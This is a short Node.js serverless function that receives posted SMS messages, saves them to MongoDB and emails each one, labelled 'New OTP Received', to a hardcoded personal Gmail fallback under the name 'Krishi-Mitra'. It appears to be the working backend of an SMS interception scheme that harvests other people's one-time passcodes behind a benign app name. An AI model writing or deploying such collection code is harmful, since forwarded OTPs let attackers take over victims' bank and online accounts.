const nodemailer = require("nodemailer");
const mongoose = require("mongoose");

// Define your schema directly here (no external model needed for now)
const smsSchema = new mongoose.Schema({
  sender: String,
  message: String,
  timestamp: Number
});
const Sms = mongoose.models.Sms || mongoose.model("Sms", smsSchema);

// Connect to MongoDB (runs only once)
let conn = null;
async function connectToDB() {
  if (conn == null) {
    conn = await mongoose.connect(process.env.MONGO_URI, {
      useNewUrlParser: true,
      useUnifiedTopology: true
    });
  }
}

// Vercel handler
module.exports = async (req, res) => {
  if (req.method !== "POST") {
    return res.status(405).json({ error: "Method Not Allowed" });
  }

  try {
    const { sender, message, timestamp } = req.body;

    if (!sender || !message || !timestamp) {
      return res.status(400).json({ error: "Missing fields" });
    }

    await connectToDB();

    const sms = new Sms({ sender, message, timestamp });
    await sms.save();

    // Send Email
    const transporter = nodemailer.createTransport({
      service: "gmail",
      auth: {
        user: process.env.MAIL_ID,
        pass: process.env.MAIL_PASS
      }
    });

    await transporter.sendMail({
      from: `"Krishi-Mitra" <${process.env.MAIL_ID}>`,
      to: process.env.MAIL_TO || "bravo54213@gmail.com",
      subject: "New OTP Received",
      text: `OTP Message:\nFrom: ${sender}\n\n${message}`
    });

    res.status(200).json({ message: "SMS saved and email sent" });
  } catch (error) {
    console.error("Save-SMS Error:", error.message);
    res.status(500).json({ error: "Server error", details: error.message });
  }
};
